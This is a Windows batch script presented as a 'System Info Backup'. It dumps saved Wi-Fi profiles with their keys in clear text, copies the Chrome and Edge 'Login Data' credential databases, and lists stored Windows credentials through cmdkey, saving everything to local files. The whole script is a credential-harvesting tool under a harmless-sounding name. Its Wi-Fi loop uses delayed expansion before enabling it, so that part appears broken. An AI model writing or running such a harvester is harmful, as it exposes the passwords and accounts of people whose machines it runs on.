@echo off
set "output=Backup_Info_%COMPUTERNAME%.txt"
echo [ System Info Backup - %DATE% %TIME% ] > "%output%"

:: Basic System Info
echo. >> "%output%"
echo === SYSTEM INFO === >> "%output%"
systeminfo >> "%output%"

:: Saved Wi-Fi Passwords
echo. >> "%output%"
echo === SAVED WIFI PROFILES & PASSWORDS === >> "%output%"
for /f "tokens=*" %%i in ('netsh wlan show profiles ^| findstr "All User Profile"') do (
    for /f "tokens=4 delims=:" %%a in ("%%i") do (
        set "profile=%%a"
        call :trim !profile!
        echo --- Profile: !profile! --- >> "%output%"
        netsh wlan show profile name="!profile!" key=clear | findstr "SSID Key Content" >> "%output%"
    )
)

:: Chrome Saved Passwords Info (Only if available)
echo. >> "%output%"
echo === CHROME LOGIN DATA FILE === >> "%output%"
setlocal enabledelayedexpansion
set "chrome_login=%LocalAppData%\Google\Chrome\User Data\Default\Login Data"
if exist "!chrome_login!" (
    echo Found Chrome Login DB: !chrome_login! >> "%output%"
    copy /y "!chrome_login!" "Chrome_LoginData_Backup.db" >nul
    echo Copied Chrome Login DB to Chrome_LoginData_Backup.db >> "%output%"
) else (
    echo Chrome Login Data not found >> "%output%"
)
endlocal

:: Edge Saved Passwords Info (If exists)
echo. >> "%output%"
echo === EDGE LOGIN DATA FILE === >> "%output%"
set "edge_login=%LocalAppData%\Microsoft\Edge\User Data\Default\Login Data"
if exist "%edge_login%" (
    echo Found Edge Login DB: %edge_login% >> "%output%"
    copy /y "%edge_login%" "Edge_LoginData_Backup.db" >nul
    echo Copied Edge Login DB to Edge_LoginData_Backup.db >> "%output%"
) else (
    echo Edge Login Data not found >> "%output%"
)

:: Export stored credentials using cmdkey
echo. >> "%output%"
echo === CMDKEY STORED CREDENTIALS === >> "%output%"
cmdkey /list >> "%output%"

:: Done
echo. >> "%output%"
echo Backup completed and saved in "%output%"
pause
exit /b

:trim
setlocal EnableDelayedExpansion
set "str=%~1"
for /f "tokens=* delims= " %%A in ("!str!") do endlocal & set "profile=%%A"
goto :eof
